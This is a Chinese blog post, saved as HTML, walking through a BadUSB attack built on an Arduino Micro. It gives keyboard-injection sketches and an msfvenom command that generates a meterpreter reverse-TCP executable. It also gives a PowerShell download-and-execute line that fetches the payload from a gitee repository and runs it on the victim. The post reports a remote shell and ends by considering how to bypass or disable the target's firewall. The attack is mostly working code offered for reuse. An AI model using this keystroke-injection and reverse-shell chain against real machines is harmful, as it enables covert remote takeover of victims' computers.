@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>基于badusb实现的基础渗透 | ticker-tape timer&#39;s blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="blog" />
+  
+
+  <meta name="description" content="badusb基础初识badusbBadUSB攻击是一种利用USB固件中的固有漏洞的攻击，将一个写入了恶意代码的定制USB设备，例如U盘，插入受害者电脑，它会伪装成HID设备（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）进行操作。它由Karsten Nohl 和 Jakob Lell 在2014年BlackHat大会上提出，特点是恶意代码存在于U盘的固件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于badusb实现的基础渗透">
+<meta property="og:url" content="https://ddjsq2333.gitee.io/2020/08/08/%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="ticker-tape timer&#39;s blog">
+<meta property="og:description" content="badusb基础初识badusbBadUSB攻击是一种利用USB固件中的固有漏洞的攻击，将一个写入了恶意代码的定制USB设备，例如U盘，插入受害者电脑，它会伪装成HID设备（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）进行操作。它由Karsten Nohl 和 Jakob Lell 在2014年BlackHat大会上提出，特点是恶意代码存在于U盘的固件">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808095934732.png">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100019010.png">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100500058.png">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100706138.png">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808101925145.png">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808102224449.png">
+<meta property="og:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808102145162.png">
+<meta property="article:published_time" content="2020-08-08T01:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-08T02:29:31.281Z">
+<meta property="article:author" content="ticker-tape timer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ddjsq2333.gitee.io/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808095934732.png">
+
+  
+
+  
+    <link rel="icon" href="/1.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    
+<link rel="stylesheet" href="/css/personal-style.css">
+
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ticker-tape timer's blog" type="application/atom+xml">
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">home</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">home</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#badusb基础"><span class="toc-text">badusb基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#初识badusb"><span class="toc-text">初识badusb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#badusb制作"><span class="toc-text">badusb制作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透"><span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后门程序制作"><span class="toc-text">后门程序制作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写代码"><span class="toc-text">编写代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开启渗透"><span class="toc-text">开启渗透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-基于badusb实现的基础渗透" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">基于badusb实现的基础渗透</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.08.08</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>ticker-tape timer</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">网络攻防实战</a>
+  </span>
+
+
+
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="badusb基础"><a href="#badusb基础" class="headerlink" title="badusb基础"></a>badusb基础</h2><h3 id="初识badusb"><a href="#初识badusb" class="headerlink" title="初识badusb"></a>初识badusb</h3><p>BadUSB攻击是一种利用USB固件中的固有漏洞的攻击，将一个写入了恶意代码的定制USB设备，例如U盘，插入受害者电脑，它会伪装成HID设备（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）进行操作。它由Karsten Nohl 和 Jakob Lell 在2014年BlackHat大会上提出，特点是恶意代码存在于U盘的固件中，杀毒软件无法访问固件区域，也就没有办法查杀这些恶意代码。应对这一攻击最有效的方法就是不要随意插入未知、不受信任的USB设备。</p>
+<p>在讲解BadUSB的原理之前要先介绍一下Rubber Ducky 和Teensy,这两种攻击也是利用HID进行攻击，将设备模拟成键盘进行按键操作，但这两个设备的缺点在于需要定制硬件设备，而BadUSB的优点就是它可以使用通用的USB设备来达成攻击。</p>
+<p>但值得注意的是，不是所有USB设备都能制作BadUSB。由于需要将恶意代码写入到固件中，我们需要编写固件并烧录到设备中。想要编写固件也就需要掌握USB设备中的芯片的指令规范，然而开发文档只有部分芯片的是开放的，所以实际上能够制作BadUSB的设备有一定的条件。</p>
+<h3 id="badusb制作"><a href="#badusb制作" class="headerlink" title="badusb制作"></a>badusb制作</h3><p>本次实验使用的开发板是Arduino/Genuino Micro，该开发板的指令与Arduino Leonardo兼容，所以只要使用Arduino Leonardo的指令去编写代码即可</p>
+<p><img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808095934732.png" alt="image-20200808095934732"></p>
+<p>先下载编写程序的开发软件，网址<a href="https://www.arduino.cc/en/Main/Software" target="_blank" rel="noopener">https://www.arduino.cc/en/Main/Software</a> ，下载完成后打开，选择相应的开发板和端口和编程器</p>
+<p><img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100019010.png" alt="image-20200808100019010"></p>
+<p>然后开始编写代码，先编写相对简单的代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span>&#123; <span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通信</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);<span class="comment">//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); <span class="comment">//按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK); <span class="comment">//释放大写键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//按下徽标键 也就是win键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">'r'</span>);<span class="comment">//按下r键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);<span class="comment">//松掉win键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">'r'</span>);<span class="comment">//松掉r键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"CMD"</span>);<span class="comment">//输入shell命令</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);  <span class="comment">//按下回车键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN); <span class="comment">//释放回车键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); <span class="comment">//按下大写键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK); <span class="comment">//释放大写键 我们再次关闭开启的大写键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译上传，成功后看到badusb自动运行程序，打开了cmd，badusb制作成功<img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100500058.png" alt="image-20200808100500058"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="后门程序制作"><a href="#后门程序制作" class="headerlink" title="后门程序制作"></a>后门程序制作</h3><p>打开kali，用MSF制作后门脚本</p>
+<p>输入：<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=182.168.248.131 LPORT=6666 -f exe &gt; shell.exe</code></p>
+<p>LHOST为kali的IP，LPORT为端口</p>
+<p><img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808100706138.png" alt="image-20200808100706138"></p>
+<p>制作好后，将它上传服务器，但是由于我懒得，所以我选择将其上传至码云仓库，效果一样，后门做好后，开始给badusb编写相应的程序</p>
+<h3 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span>&#123; <span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通信</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);<span class="comment">//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); <span class="comment">//按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK); <span class="comment">//释放大写键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//按下徽标键 也就是win键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">'r'</span>);<span class="comment">//按下r键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);<span class="comment">//松掉win键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">'r'</span>);<span class="comment">//松掉r键 </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL = 'HTTPS://GITEE.COM/DDJSQ2333/SHELL/RAW/MASTER/SHELL1.EXE';$FILE = 'd:\\SHELL2.EXE';$CLNT.dOWNLOADfILE($URL,$FILE);d:\\SHELL2.EXE;"</span>);<span class="comment">//输入shell命令</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);  <span class="comment">//按下回车键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN); <span class="comment">//释放回车键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); <span class="comment">//按下大写键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK); <span class="comment">//释放大写键 我们再次关闭开启的大写键</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实就是改了输入的shell命令，用cmd下载东西，主要通过下列代码下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$clnt &#x3D; new-object System.Net.WebClient;</span><br><span class="line">$url &#x3D; &#39;https:&#x2F;&#x2F;gitee.com&#x2F;ddjsq2333&#x2F;shell&#x2F;raw&#x2F;master&#x2F;shell1.exe&#39;;</span><br><span class="line">$file &#x3D; &#39;D:\\shell2.exe&#39;;</span><br><span class="line">$clnt.DownloadFile($url,$file);</span><br><span class="line">D:\\shell2.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="开启渗透"><a href="#开启渗透" class="headerlink" title="开启渗透"></a>开启渗透</h3><p><img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808101925145.png" alt="image-20200808101925145"></p>
+<p>在目标机插入该badsub，发现kali接收到弹到的shell了，文件管理器中也出现的后门程序</p>
+<p><img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808102224449.png" alt="image-20200808102224449"></p>
+<p><img src="/.io//%E5%9F%BA%E4%BA%8Ebadusb%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%B8%97%E9%80%8F/image-20200808102145162.png" alt="image-20200808102145162"></p>
+<p>渗透成功，get shell了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>badusb虽然无法被防火墙识别到，但是它从码云仓库下载下来的后门软件会被防火墙检测到，所以要成功，要么先关闭防火墙，要么想办法绕过或者关闭防火墙，后面的操作还在研究</p>
+
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/07/29/%E8%BE%A9%E8%AE%BA%E9%98%9F%E4%B8%80%E9%9D%A2%E8%BE%A9%E9%A2%98%E8%B5%84%E6%96%99/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2020/09/15/%E5%88%86%E6%9E%90%E7%BD%91%E6%98%93%E4%BA%91%E5%8A%A0%E5%AF%86/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
